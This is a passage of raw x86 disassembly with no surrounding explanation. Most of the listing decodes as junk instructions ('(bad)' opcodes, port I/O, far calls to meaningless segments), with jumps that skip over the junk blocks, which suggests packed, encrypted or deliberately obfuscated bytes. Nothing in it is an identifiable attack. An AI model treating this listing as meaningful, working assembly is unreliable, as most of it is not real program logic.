  403a31:	mov    edx,DWORD PTR [ebp+0xc]
  403a34:	movsx  edx,BYTE PTR [edx]
  403a37:	xor    eax,ecx
  403a39:	add    eax,esi
  403a3b:	cmp    edx,eax
  403a3d:	jmp    0x403c0a
  403a42:	retf   
  403a43:	int3   
  403a44:	push   edi
  403a45:	push   0x6df17151
  403a4a:	mov    ch,0x57
  403a4c:	push   ebx
  403a4d:	mov    edi,0x4466388e
  403a52:	adc    dl,BYTE PTR [ecx]
  403a54:	jle    0x403ad4
  403a56:	scas   al,BYTE PTR es:[edi]
  403a57:	jg     0x403ad7
  403a59:	jle    0x403a1c
  403a5b:	inc    ebp
  403a5c:	inc    ecx
  403a5d:	ja     0x4039fb
  403a5f:	sub    eax,0xaf6c432
  403a64:	mov    al,BYTE PTR ds:0x89a20e72
  403a6a:	pop    edi
  403a6b:	test   al,0x8d
  403a6d:	jo     0x403aec
  403a6f:	repz xlat BYTE PTR ds:[ebx]
  403a71:	cwde   
  403a72:	sub    al,0xad
  403a74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a75:	cmp    esi,DWORD PTR [edx-0x43]
  403a78:	ins    BYTE PTR es:[edi],dx
  403a79:	je     0x403a7f
  403a7b:	lods   eax,DWORD PTR ds:[esi]
  403a7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a7d:	inc    ecx
  403a7e:	sub    BYTE PTR [esi+ebp*2],cl
  403a81:	arpl   WORD PTR [eax+ebx*8-0x18df4c0f],bx
  403a88:	push   esi
  403a89:	aas    
  403a8a:	out    0x4c,eax
  403a8c:	pop    es
  403a8d:	sahf   
  403a8e:	jnp    0x403a7d
  403a90:	cdq    
  403a91:	loop   0x403aa6
  403a93:	pop    ebp
  403a94:	lods   eax,DWORD PTR ds:[esi]
  403a95:	push   esp
  403a96:	mov    ebp,0x8fed217f
  403a9b:	add    eax,0xa90aa8e8
  403aa0:	fbstp  TBYTE PTR [edx+0x9]
  403aa3:	das    
  403aa4:	jle    0x403b05
  403aa6:	fwait
  403aa7:	pop    es
  403aa8:	(bad)  
  403aa9:	jl     0x403b1e
  403aab:	lods   al,BYTE PTR ds:[esi]
  403aac:	mov    bl,0x16
  403aae:	scas   al,BYTE PTR es:[edi]
  403aaf:	dec    ebx
  403ab0:	push   ss
  403ab1:	and    al,cl
  403ab3:	mov    DWORD PTR [ebp+esi*8-0x2a],eax
  403ab7:	jno    0x403ad0
  403ab9:	mov    ds:0x70adbf9b,al
  403abe:	sub    DWORD PTR [edx+0x62],esi
  403ac1:	xlat   BYTE PTR ds:[ebx]
  403ac2:	ror    BYTE PTR [ebp+0x47db0fec],cl
  403ac8:	fstp   TBYTE PTR [edx+0x625296fa]
  403ace:	pop    es
  403acf:	xchg   ecx,eax
  403ad0:	and    DWORD PTR [eax+eax*2+0x68],0x11
  403ad5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ad6:	mov    esi,0xb6e4d90
  403adb:	pop    ecx
  403adc:	sub    ecx,DWORD PTR [eax]
  403ade:	sti    
  403adf:	cmp    cx,WORD PTR [edx+0x589e1379]
  403ae6:	and    BYTE PTR [eax-0x21b3b0b3],ch
  403aec:	ja     0x403af2
  403aee:	sub    eax,esi
  403af0:	cmp    al,0xa5
  403af2:	repnz fnstcw WORD PTR [edx-0x279376aa]
  403af9:	push   es
  403afa:	fwait
  403afb:	add    eax,DWORD PTR [ebp+eiz*4-0x6f88179f]
  403b02:	sar    BYTE PTR [esi],1
  403b04:	xor    BYTE PTR [ecx+0x39fa3d4],dh
  403b0a:	les    ebx,FWORD PTR [ebp+0x40]
  403b0d:	inc    ebp
  403b0e:	je     0x403af8
  403b10:	jecxz  0x403b44
  403b12:	adc    DWORD PTR [esi+0x21],edx
  403b15:	aas    
  403b16:	jbe    0x403b8c
  403b18:	mov    dl,0xf
  403b1a:	gs cmp eax,0x8576ea36
  403b20:	dec    esi
  403b21:	dec    eax
  403b22:	pop    eax
  403b23:	inc    ecx
  403b24:	or     DWORD PTR [ebx],esi
  403b26:	addr16 (bad) 
  403b28:	pushf  
  403b29:	push   ds
  403b2a:	icebp  
  403b2b:	(bad)  
  403b2c:	cmc    
  403b2d:	adc    edi,DWORD PTR ds:0xa6af1541
  403b33:	mov    DWORD PTR [esi],ebx
  403b35:	mov    al,0x32
  403b37:	popf   
  403b38:	dec    esi
  403b39:	mov    ah,0xe2
  403b3b:	and    BYTE PTR gs:[ebx+0x7df74de0],al
  403b42:	mov    ds:0x5b10a4ec,al
  403b47:	enter  0x342d,0xcc
  403b4b:	cli    
  403b4c:	adc    DWORD PTR [ebx-0x4ce93ead],edx
  403b52:	add    eax,0x8431c8be
  403b57:	test   al,0xcd
  403b5a:	aad    0x9a
  403b5c:	fst    DWORD PTR [edi+0x9]
  403b5f:	imul   ecx,DWORD PTR [esp+edi*1],0xffffffaf
  403b63:	std    
  403b64:	inc    ecx
  403b65:	call   0xb934:0x9d6435eb
  403b6c:	or     eax,0x6e9fb7f6
  403b71:	inc    di
  403b73:	std    
  403b74:	xchg   esi,eax
  403b75:	pop    es
  403b76:	mov    dh,0x28
  403b78:	or     al,BYTE PTR [edx+0x71a34c22]
  403b7e:	neg    BYTE PTR [bp+di]
  403b81:	mov    bl,0xea
  403b83:	xchg   edx,eax
  403b84:	jg     0x403b46
  403b86:	cdq    
  403b87:	neg    BYTE PTR gs:[ebx+0xe296bde]
  403b8e:	(bad)  
  403b8f:	stc    
  403b90:	fs or  al,0xdb
  403b93:	push   0x7f44b4ac
  403b98:	mov    DWORD PTR [edi*2-0x1130b6fe],edi
  403b9f:	repz inc di
  403ba2:	pop    ebx
  403ba3:	add    DWORD PTR [edi+eax*4-0x2f490ec0],ecx
  403baa:	jnp    0x403be2
  403bac:	jb     0x403b4e
  403bae:	mov    ebx,0xe1fb097f
  403bb3:	hlt    
  403bb4:	mov    cl,0x5f
  403bb6:	xor    ecx,DWORD PTR [eax]
  403bb8:	fist   DWORD PTR [edi+0x37]
  403bbb:	jno    0x403bd1
  403bbd:	and    DWORD PTR [edi+0x5b685c92],edx
  403bc3:	daa    
  403bc4:	outs   dx,DWORD PTR ds:[esi]
  403bc5:	retf   0x59e2
  403bc8:	add    DWORD PTR [edx+ecx*1-0x1a],ebp
  403bcc:	xchg   esi,eax
  403bcd:	mov    ebp,esp
  403bcf:	outs   dx,BYTE PTR ds:[esi]
  403bd0:	outs   dx,DWORD PTR ds:[esi]
  403bd1:	add    al,0xe7
  403bd3:	cmp    dl,BYTE PTR [eax-0x845ddd9]
  403bd9:	ins    DWORD PTR es:[edi],dx
  403bda:	retf   0x167a
  403bdd:	pop    edx
  403bde:	pop    edi
  403bdf:	sbb    al,0x55
  403be1:	push   edi
  403be2:	in     eax,0xd0
  403be4:	pop    eax
  403be5:	xor    eax,0x28349127
  403bea:	mov    bl,0xd7
  403bec:	ins    DWORD PTR es:[edi],dx
  403bed:	mov    al,ds:0xe2e6782a
  403bf2:	pusha  
  403bf3:	inc    ebx
  403bf4:	cdq    
  403bf5:	(bad)  
  403bf6:	inc    esi
  403bf7:	mov    ebx,0x4903dd3d
  403bfc:	adc    cl,dl
  403bfe:	icebp  
  403bff:	loope  0x403b8b
  403c01:	popa   
  403c02:	imul   ecx,esi,0xec07e0c5
  403c08:	push   0x77
  403c0a:	je     0x4041a7
  403c10:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  403c17:	jmp    0x403de4
  403c1c:	scas   eax,DWORD PTR es:[edi]
  403c1d:	or     cl,BYTE PTR [edx]
  403c1f:	xor    eax,0x90b135ab
  403c24:	mov    esp,0xc6dcf48b
  403c29:	sar    DWORD PTR [ecx+ecx*8+0x42],1
  403c2d:	push   ds
  403c2e:	jle    0x403cae
  403c30:	scas   al,BYTE PTR es:[edi]
  403c31:	jg     0x403cb1
  403c33:	jle    0x403c40
  403c35:	aam    0xcd
  403c37:	adc    DWORD PTR [esi-0x5d9fe1e6],esp
  403c3d:	mov    bh,0x2
  403c3f:	xor    DWORD PTR [ecx+0x6b],0x4c
  403c43:	mov    edi,0xc21a7ab0
  403c48:	push   ebx
  403c49:	and    edi,ecx
  403c4b:	aad    0x7b
  403c4d:	sbb    DWORD PTR [edi-0x5a],ecx
  403c50:	cli    
  403c51:	hlt    
  403c52:	pop    esi
  403c53:	mov    ds:0x6d61ec1b,al
  403c58:	fisub  WORD PTR [ecx-0x4d]
  403c5b:	icebp  
  403c5c:	xchg   edi,eax
  403c5d:	adc    al,0xfa
  403c5f:	lock stc 
  403c61:	push   edx
  403c62:	jp     0x403c57
  403c64:	sbb    ebx,edi
  403c66:	cwde   
  403c67:	in     eax,dx
  403c68:	mov    edi,DWORD PTR [ebx+ebp*2]
  403c6b:	popw   ss
  403c6d:	mov    edx,0x77b779b9
  403c72:	dec    eax
  403c73:	xor    cl,dl
  403c75:	xchg   BYTE PTR [edi-0x46],dl
  403c78:	test   DWORD PTR [esi-0x621c46ad],ecx
  403c7e:	ins    BYTE PTR es:[edi],dx
  403c7f:	dec    edi
  403c80:	repnz lds esp,FWORD PTR [eax]
  403c83:	sbb    al,0x78
  403c85:	sar    BYTE PTR [esi+0x53020116],0xd7
  403c8c:	mov    ebx,0x1d9cf95c
  403c91:	pop    ebx
  403c92:	mov    BYTE PTR [esi],0xca
  403c95:	pop    ds
  403c96:	cmc    
  403c97:	push   esi
  403c98:	loop   0x403cee
  403c9a:	pop    ecx
  403c9b:	cmp    al,0x83
  403c9d:	add    esp,DWORD PTR [ecx]
  403c9f:	nop
  403ca0:	je     0x403c6b
  403ca2:	dec    esp
  403ca3:	jo     0x403d00
  403ca5:	mov    ch,0x17
  403ca7:	into   
  403ca8:	les    esi,FWORD PTR [ecx+0x3662eb57]
  403cae:	iret   
  403caf:	arpl   WORD PTR [ecx-0x3e],dx
  403cb2:	in     eax,dx
  403cb3:	push   esi
  403cb4:	xor    eax,0x4ab2da05
  403cb9:	cmc    
  403cba:	lea    esi,[ebx-0x7832cd0]
  403cc0:	add    ecx,esp
  403cc2:	aaa    
  403cc3:	xchg   ecx,eax
  403cc4:	dec    DWORD PTR [edx]
  403cc6:	(bad)
  403cca:	call   0xfb1d:0x2d7a3a2e
  403cd1:	ret    0x8f73
  403cd4:	or     edx,DWORD PTR [ebx+edi*2]
  403cd7:	adc    al,0x1a
  403cd9:	rcr    edi,cl
  403cdb:	dec    esp
  403cdc:	push   cs
  403cdd:	mov    ebx,0x8bf90ca4
  403ce2:	mov    ds:0xdbdf8b9e,al
  403ce7:	add    DWORD PTR [ecx],edi
  403ce9:	jmp    0x403c7b
  403ceb:	(bad)  
  403cec:	mov    ch,0xab
  403cee:	stos   BYTE PTR es:[edi],al
  403cef:	mov    eax,0xc93bbed0
  403cf4:	mov    ecx,0xc15fc27b
  403cf9:	scas   al,BYTE PTR es:[edi]
  403cfa:	in     al,0x12
  403cfc:	outs   dx,BYTE PTR ds:[esi]
  403cfd:	push   ebp
  403cfe:	push   es
  403cff:	(bad)  
  403d00:	jle    0x403ce6
  403d02:	aas    
  403d03:	nop
  403d04:	and    ebx,DWORD PTR [eax+0x3a3c3946]
  403d0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d0b:	cli    
  403d0c:	xchg   ebp,eax
  403d0d:	inc    edi
  403d0e:	add    eax,0x62a0ccce
  403d13:	push   ebx
  403d14:	push   esp
  403d15:	jns    0x403d2a
  403d17:	shl    cl,0x74
  403d1a:	cmc    
  403d1b:	cli    
  403d1c:	fidivr DWORD PTR [ebx-0x30ca1d24]
  403d22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d23:	enter  0x8fc7,0xb2
  403d27:	scas   eax,DWORD PTR es:[edi]
  403d28:	lock push esp
  403d2a:	loopne 0x403d0a
  403d2c:	sub    esi,ebp
  403d2e:	push   ds
  403d2f:	out    0xd0,eax
  403d31:	sbb    eax,edx
  403d33:	(bad)  
  403d34:	popa   
  403d35:	jno    0x403d34
  403d37:	cli    
  403d38:	pushf  
  403d39:	repz mov WORD PTR [eax+esi*4-0x37],?
  403d3e:	sbb    eax,0x319ca033
  403d43:	cmp    eax,0xaedcf9ca
  403d48:	in     eax,dx
  403d49:	cmp    ah,BYTE PTR [ebx+eiz*8]
  403d4c:	sub    al,0xfc
  403d4e:	inc    ebx
  403d4f:	push   ds
  403d50:	fisub  WORD PTR [esi-0x11f17788]
  403d56:	sub    DWORD PTR [edx],edx
  403d58:	xor    bh,cl
  403d5a:	inc    eax
  403d5b:	adc    al,0x34
  403d5d:	inc    BYTE PTR [edi+0x4a9ba024]
  403d63:	sub    BYTE PTR [eax],bl
  403d65:	cli    
  403d66:	dec    esp
  403d67:	sub    ebp,edx
  403d69:	or     DWORD PTR [eax+ecx*1],esp
  403d6c:	int    0x2f
  403d6e:	sti    
  403d6f:	ins    BYTE PTR es:[edi],dx
  403d70:	jo     0x403de1
  403d72:	push   ebx
  403d73:	jge    0x403d50
  403d75:	inc    esp
  403d76:	cli    
  403d77:	cmp    esp,DWORD PTR [ebx]
  403d79:	(bad)  
  403d7a:	(bad)  
  403d7b:	jl     0x403dd2
  403d7d:	(bad)  
  403d7e:	rcl    ecx,cl
  403d80:	mov    ss,WORD PTR [edi]
  403d82:	loopne 0x403d9f
  403d84:	or     esi,DWORD PTR [ebp-0x3ccb603f]
  403d8a:	ja     0x403d4b
  403d8c:	jmp    FWORD PTR [ebp+ecx*8-0x3138f8b7]
  403d93:	and    bh,ah
  403d95:	add    ecx,ecx
  403d97:	(bad)  
  403d98:	sti    
  403d99:	or     DWORD PTR cs:[ecx-0xe],esi
  403d9d:	clc    
  403d9e:	pop    ebx
  403d9f:	push   ecx
  403da0:	xor    ebx,DWORD PTR [ecx-0x43]
  403da3:	data16 jmp 0x403d6e
  403da6:	pop    ecx
  403da7:	lods   eax,DWORD PTR ds:[esi]
  403da8:	cmp    BYTE PTR [ebx],0xa9
  403dab:	aam    0xe9
  403dad:	pop    ebp
  403dae:	ret    
  403daf:	std    
  403db0:	push   edi
  403db1:	inc    eax
  403db2:	dec    eax
  403db3:	and    ah,BYTE PTR [ecx+0x44dc2fde]
  403db9:	sbb    al,0x32
  403dbb:	mov    ebx,DWORD PTR [eax+0x4a7aa081]
  403dc1:	mov    edx,0x1393bf0a
  403dc6:	sbb    BYTE PTR [edx+ebp*2+0x6f2c8f21],al
  403dcd:	xchg   edx,eax
  403dce:	inc    esi
  403dcf:	fcmovu st,st(4)
  403dd1:	in     eax,dx
  403dd2:	lahf   
  403dd3:	adc    eax,DWORD PTR [ebp+0x6a]
  403dd6:	pusha  
  403dd7:	mov    ebx,0xddcf6bb4
  403ddc:	push   edx
  403ddd:	push   ss
  403dde:	dec    edi
  403ddf:	je     0x403d8b
  403de1:	mov    WORD PTR [edx],?
  403de3:	or     DWORD PTR [ebp+0x4589e845],0xffffffec
  403dea:	mov    eax,DWORD PTR [ebp-0x14]
  403ded:	add    DWORD PTR [eax],0x705fa8f
  403df3:	jmp    0x403fc0
  403df8:	mov    ebp,0xd441cc57
  403dfd:	inc    ecx
  403dfe:	push   ecx
  403dff:	push   ebx
  403e00:	jb     0x403dc4
  403e02:	and    DWORD PTR [edi+0x7fbbc29],0x7e7e1cf2
  403e0c:	scas   al,BYTE PTR es:[edi]
  403e0d:	jg     0x403e8d
  403e0f:	jle    0x403daa
  403e11:	xor    DWORD PTR [esi+eiz*4+0x3],0x16
  403e16:	imul   ebp,ebx,0xffffffff
  403e19:	xor    BYTE PTR [edx],dh
  403e1b:	add    bh,BYTE PTR [edi+0x15]
  403e1e:	jp     0x403e06
  403e20:	pushf  
  403e21:	lahf   
  403e22:	pop    ecx
  403e23:	mov    esp,DWORD PTR [ebx]
  403e25:	bound  edx,QWORD PTR ds:0x75aeb5c8
  403e2b:	sahf   
  403e2c:	test   DWORD PTR [edx],esp
  403e2e:	packuswb mm0,QWORD PTR [edx+0x157746a7]
  403e35:	dec    ebp
  403e36:	adc    al,0x35
  403e38:	or     DWORD PTR [eax-0x2a],eax
  403e3b:	test   eax,0xbab5d019
  403e40:	data16 and BYTE PTR [eax],ah
  403e43:	add    DWORD PTR [ebx-0x78],esi
  403e46:	sbb    eax,0xe3eef9e2
  403e4b:	sub    BYTE PTR [ecx+0x7400b5d],cl
  403e51:	loope  0x403e14
  403e53:	mov    eax,0xff7cbc79
  403e58:	ins    DWORD PTR es:[edi],dx
  403e59:	pop    ds
  403e5a:	pop    ebx
  403e5b:	xor    dl,ah
  403e5d:	(bad)  
  403e5f:	xchg   ecx,eax
  403e60:	test   al,0xba
  403e62:	mov    al,0x3e
  403e64:	shl    esp,cl
  403e66:	ror    BYTE PTR [ebp-0x41],0xeb
  403e6a:	rol    BYTE PTR [edi+0x336b1364],0x4a
  403e71:	imul   ecx,DWORD PTR [edi+0x47731c4],0x86606991
  403e7b:	fwait
  403e7c:	cld    
  403e7d:	nop
  403e7e:	loope  0x403eaa
  403e80:	add    eax,DWORD PTR [edx+edx*8+0x5]
  403e84:	add    al,0x3
  403e86:	pop    esp
  403e87:	std    
  403e88:	neg    BYTE PTR [edi-0x135b1ba6]
  403e8e:	adc    ecx,DWORD PTR [ecx]
  403e90:	or     ebp,DWORD PTR [edx+eiz*4+0x51134a45]
  403e97:	clc    
  403e98:	sbb    DWORD PTR [eax],esp
  403e9a:	push   ss
  403e9b:	and    ebp,DWORD PTR [edx-0x4c939411]
  403ea1:	jg     0x403e75
  403ea3:	fld    TBYTE PTR [eax]
  403ea5:	in     al,0xb3
  403ea7:	mov    bl,0x11
  403ea9:	jmp    0x9f67da72
  403eae:	xchg   edi,eax
  403eaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403eb0:	hlt    
  403eb1:	jmp    DWORD PTR [edx+eax*4+0x4e17c26f]
  403eb8:	cdq    
  403eb9:	fnstenv [edx+0xc]
  403ebc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ebd:	sar    BYTE PTR [ebx],cl
  403ebf:	jo     0x403f16
  403ec1:	xchg   esi,eax
  403ec2:	enter  0xe892,0xb6
  403ec6:	rcl    DWORD PTR [esi+ebp*1],cl
  403ec9:	sub    BYTE PTR [edx+0x3a68f47d],bh
  403ecf:	out    0x95,eax
  403ed1:	dec    edi
  403ed2:	jmp    FWORD PTR [edi]
  403ed4:	mov    ds:0xe6dc36ce,eax
  403ed9:	rcl    BYTE PTR [eax],1
  403edb:	arpl   WORD PTR [esi+0x45ac9b5a],ax
  403ee1:	dec    ebx
  403ee2:	ja     0x403f07
  403ee4:	sahf   
  403ee5:	scas   al,BYTE PTR es:[edi]
  403ee6:	nop
  403ee7:	add    dl,BYTE PTR [edx+0x48]
  403eea:	test   al,0x77
  403eec:	sbb    BYTE PTR [ebx-0x69],al
  403eef:	mov    al,0x50
  403ef1:	in     al,0xf6
  403ef3:	aas    
  403ef4:	mov    al,ds:0xb968c02f
  403ef9:	mov    cl,0x5b
  403efb:	push   0x9f89ccc7
  403f00:	ins    DWORD PTR es:[edi],dx
  403f01:	xchg   DWORD PTR [edi],ebx
  403f03:	mov    DWORD PTR [eax],ecx
  403f05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f07:	test   al,0xa2
  403f09:	les    esi,FWORD PTR [ebp-0x47]
  403f0c:	push   esp
  403f0d:	addr16 jmp 0x403ea0
  403f10:	leave  
  403f11:	iret   
  403f12:	ins    BYTE PTR es:[edi],dx
  403f13:	clc    
  403f14:	push   ebx
  403f15:	or     esp,ebp
  403f17:	dec    edi
  403f18:	in     al,dx
  403f19:	fwait
  403f1a:	in     al,dx
  403f1b:	add    eax,0xbb34bfda
  403f20:	mov    al,0x78
  403f22:	adc    al,0xf1
  403f24:	inc    edx
  403f25:	adc    esi,DWORD PTR [ecx+0x55]
  403f28:	inc    ecx
  403f29:	push   esp
  403f2a:	stos   BYTE PTR es:[edi],al
  403f2b:	(bad)  
  403f2c:	adc    BYTE PTR [edi],bl
  403f2e:	test   eax,0xf4ee22e4
  403f33:	fldenv [ecx]
  403f35:	ret    
  403f36:	out    0x66,al
  403f38:	cmp    edi,DWORD PTR [ecx]
  403f3a:	pop    ebp
  403f3b:	inc    ebx
  403f3c:	xchg   edx,eax
  403f3d:	jle    0x403f76
  403f3f:	fidivr WORD PTR [ecx-0x7a9e0e77]
  403f45:	add    ebx,DWORD PTR [esi]
  403f47:	std    
  403f48:	lea    ebp,[ebx]
  403f4a:	pusha  
  403f4b:	mov    ch,0x66
  403f4d:	test   DWORD PTR [eax-0x7249e9ce],ebx
  403f53:	ficom  WORD PTR [ebx-0x6849e61]
  403f59:	xchg   edx,eax
  403f5a:	es aam 0xec
  403f5d:	dec    eax
  403f5e:	les    ebp,FWORD PTR [edi-0x6d]
  403f61:	or     cl,al
  403f63:	into   
  403f64:	sub    al,0x2
  403f66:	pop    ss
  403f67:	mov    eax,DWORD PTR [ecx-0x5e]
  403f6a:	adc    cl,BYTE PTR [eax]
  403f6c:	xor    eax,0xd0006622
  403f71:	test   DWORD PTR [esp+eax*1],0x62afa2cc
  403f78:	scas   eax,DWORD PTR es:[edi]
  403f79:	xor    ecx,DWORD PTR [ecx+0x635876eb]
  403f7f:	mov    ah,0x90
  403f81:	pusha  
  403f82:	pop    ebp
  403f83:	jle    0x403fde
  403f85:	push   esi
  403f86:	mov    dl,0x70
  403f88:	in     eax,dx
  403f89:	stc    
  403f8a:	fild   QWORD PTR [eax]
  403f8c:	dec    DWORD PTR [edi-0x79803d1]
  403f92:	int3   
  403f93:	js     0x403f18
  403f95:	cld    
  403f96:	jns    0x403f6d
  403f98:	js     0x40400d
  403f9a:	ja     0x403fad
  403f9c:	dec    ebp
  403f9d:	push   eax
  403f9e:	sbb    dl,dh
  403fa0:	es cdq 
  403fa2:	pop    edi
  403fa3:	ror    BYTE PTR [esi+esi*2],1
  403fa6:	adc    al,0x81
  403fa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fa9:	jle    0x403fe9
  403fab:	repnz mov DWORD PTR [ebx],ebx
  403fae:	and    al,0x82
  403fb0:	mov    esp,0x39a4fea1
  403fb5:	ja     0x403faf
  403fb7:	dec    esp
  403fb8:	aas    
  403fb9:	retf   0x9b88
  403fbc:	daa    
  403fbd:	mov    ebx,0x458be1ca
  403fc2:	lock mov edx,DWORD PTR [ebp+0x8]
  403fc6:	xor    eax,ecx
  403fc8:	jmp    0x404195
  403fcd:	pop    edi
  403fce:	sub    al,0x9f
  403fd0:	dec    edx
  403fd1:	ins    DWORD PTR es:[edi],dx
  403fd2:	dec    ecx
  403fd3:	imul   ebp,DWORD PTR [ecx],0x54
  403fd6:	and    dl,0x1
  403fd9:	es sahf 
  403fdb:	js     0x40400d
  403fdd:	and    bl,BYTE PTR [edx]
  403fdf:	jle    0x40405f
  403fe1:	scas   al,BYTE PTR es:[edi]
  403fe2:	jg     0x404062
  403fe4:	jle    0x40402d
  403fe6:	mov    bl,0x74
  403fe8:	cmc    
  403fe9:	scas   eax,DWORD PTR es:[edi]
  403fea:	jne    0x403f8d
  403fec:	push   ecx
  403fed:	and    BYTE PTR [esi-0x7f427445],dh
  403ff3:	sbb    ch,dl
  403ff5:	fwait
  403ff6:	test   al,0xd9
  403ff8:	ins    BYTE PTR es:[edi],dx
  403ff9:	mov    al,ds:0xd8a5ddc4
  403ffe:	les    ecx,FWORD PTR [edx+0x75]
  404001:	iret   
  404002:	add    eax,0xca845150
  404007:	sub    al,0x24
  404009:	mov    al,0xe2
  40400b:	dec    ecx
  40400c:	test   DWORD PTR [esi],esi
  40400e:	call   0xc624:0x5d68607f
  404015:	add    eax,0xe4f2bef0
  40401a:	dec    eax
  40401b:	sub    BYTE PTR [ebx],ch
  40401d:	or     al,0x77
  40401f:	push   0x71
  404021:	jg     0x404092
  404023:	add    DWORD PTR [edx+0x631ad833],0x31ae1a80
  40402d:	add    bh,bl
  40402f:	dec    ebp
  404030:	mov    al,ds:0x29227a63
  404035:	push   ds
  404036:	call   0xf2e9:0xa23ac9bb
  40403d:	arpl   WORD PTR [ecx+0x20],dx
  404040:	pop    ebp
  404041:	dec    ebx
  404042:	icebp  
  404043:	jnp    0x4040bd
  404045:	mov    edi,0x40a9bb2e
  40404a:	jo     0x4040c4
  40404c:	xchg   esp,eax
  40404d:	shr    BYTE PTR [edi-0x569d0bb9],1
  404053:	in     al,dx
  404054:	out    0x40,eax
  404056:	repz adc DWORD PTR [edi+0x121564cb],eax
  40405d:	in     eax,0xc9
  40405f:	inc    edi
  404060:	rcr    edx,cl
  404062:	neg    ecx
  404064:	jmp    0x48ee:0xeab54367
  40406b:	add    al,0x16
  40406d:	enter  0xe054,0x43
  404071:	pop    esi
  404072:	inc    esi
  404073:	neg    DWORD PTR [ecx]
  404075:	sub    eax,0xc34afcb0
  40407a:	push   cs
  40407b:	lea    eax,[edi+0x286636d7]
  404081:	ja     0x404044
  404083:	push   0xffffffe0
  404085:	test   BYTE PTR [eax],dl
  404087:	ret    
  404088:	mov    ecx,0xa49c7313
  40408d:	mov    dl,0xfb
  40408f:	lods   eax,DWORD PTR ds:[esi]
  404090:	enter  0x1453,0xe5
  404094:	xchg   DWORD PTR [ebx-0x7b745c7b],eax
  40409a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40409b:	jae    0x4040f5
  40409d:	mov    al,0xef
  40409f:	sbb    eax,0xb70f9829
  4040a4:	mov    esp,DWORD PTR es:[esi-0xe]
  4040a8:	mov    ebx,0x63a55e79
  4040ad:	jmp    0x404036
  4040af:	test   DWORD PTR ds:0x21ccdc1b,edi
  4040b5:	cmovbe edx,edi
  4040b8:	lock in eax,0x73
  4040bb:	popa   
  4040bc:	test   DWORD PTR [ebp+ecx*1+0x68f50a96],eax
  4040c3:	xchg   ebx,eax
  4040c4:	cld    
  4040c5:	push   edx
  4040c6:	and    ebp,DWORD PTR [ebx]
  4040c8:	fdiv   DWORD PTR [esi+0x3d2ab061]
  4040ce:	cmp    al,0x3f
  4040d0:	mov    esp,0x1837682c
  4040d5:	xchg   edi,eax
  4040d6:	cld    
  4040d7:	sti    
  4040d8:	jns    0x4040cd
  4040da:	or     edx,esi
  4040dc:	add    ecx,DWORD PTR [esi+0x5b]
  4040df:	test   eax,0xdb5ed1f2
  4040e4:	jne    0x40410a
  4040e6:	scas   al,BYTE PTR es:[edi]
  4040e7:	fdivr  QWORD PTR [ebp+0x4b]
  4040ea:	shl    DWORD PTR [ebp-0x2448ab9a],cl
  4040f0:	jmp    0x4040ab
  4040f2:	mov    ecx,0x3204ae90
  4040f7:	xchg   ebx,eax
  4040f8:	cmp    ebx,DWORD PTR [ecx+ecx*8-0xd]
  4040fc:	stos   BYTE PTR es:[edi],al
  4040fd:	mov    dh,0xb
  4040ff:	xchg   esi,eax
  404100:	mov    ds:0x35537912,eax
  404105:	nop
  404106:	punpckhwd mm6,QWORD PTR [eax+0x1d]
  40410a:	xor    eax,DWORD PTR [ebx+0x3e]
  40410d:	ins    BYTE PTR es:[edi],dx
  40410e:	pusha  
  40410f:	aam    0x56
  404111:	mov    eax,DWORD PTR [eax]
  404113:	sub    esp,esi
  404115:	ret    
  404116:	xor    ebx,edi
  404118:	pushf  
  404119:	jecxz  0x4040f6
  40411b:	retf   
  40411c:	inc    esi
  40411d:	(bad)  
  40411e:	fnsave [eax-0x243e38ed]
  404124:	pop    edi
  404125:	clc    
  404126:	popa   
  404127:	or     al,0x4c
  404129:	mov    bl,0x5f
  40412b:	mov    ebp,0xb0b2fa8e
  404130:	xchg   esp,eax
  404131:	xchg   ebx,eax
  404132:	inc    ecx
  404133:	bnd jne 0x4040f2
  404136:	fprem1 
  404138:	repz aam 0x1a
  40413b:	enter  0x7514,0xbe
  40413f:	and    ah,BYTE PTR [ecx+0x66]
  404142:	popa   
  404143:	popf   
  404144:	dec    esp
  404145:	test   DWORD PTR [eax+eiz*4-0x3bd3081d],ebx
  40414c:	xor    eax,DWORD PTR es:[eax-0x18]
  404150:	push   0x802d2f93
  404155:	or     edi,DWORD PTR [edx-0x1f]
  404158:	imul   BYTE PTR [eax+0x44]
  40415b:	test   al,0x8
  40415d:	adc    DWORD PTR [ecx-0x44],eax
  404160:	pop    es
  404161:	mov    esi,0x3c3acdf6
  404166:	dec    esp
  404167:	test   eax,0x8c53dde4
  40416c:	and    edx,ecx
  40416e:	sti    
  40416f:	cs retf 
  404171:	and    DWORD PTR [esi-0x6b],0xa0855bc2
  404178:	and    BYTE PTR [edi+0x47d48a5],ch
  40417e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40417f:	and    al,0x7a
  404181:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404182:	clc    
  404183:	arpl   WORD PTR [ebx+0x13b70257],bx
  404189:	ret    0x957a
  40418c:	mov    eax,0xfe0fb378
  404191:	pop    ss
  404192:	dec    eax
  404193:	div    BYTE PTR [ecx-0x73]
  404196:	test   BYTE PTR [eax],dl
  404198:	fwait
  404199:	jb     0x4041cd
  40419b:	add    BYTE PTR [ecx+0x45ff0845],cl
  4041a1:	or     al,0xe9
  4041a3:	arpl   ax,di
  4041a5:	(bad)  
  4041a6:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  4041ac:	mov    ecx,DWORD PTR [ebp+0x10]
  4041af:	add    eax,esi
  4041b1:	mov    DWORD PTR [ecx],eax
  4041b3:	pop    esi
  4041b4:	leave  
  4041b5:	ret    0xc
  4041b8:	push   ebp
  4041b9:	mov    ebp,esp
  4041bb:	push   ecx
  4041bc:	push   ecx
  4041bd:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4041c4:	jmp    0x404388
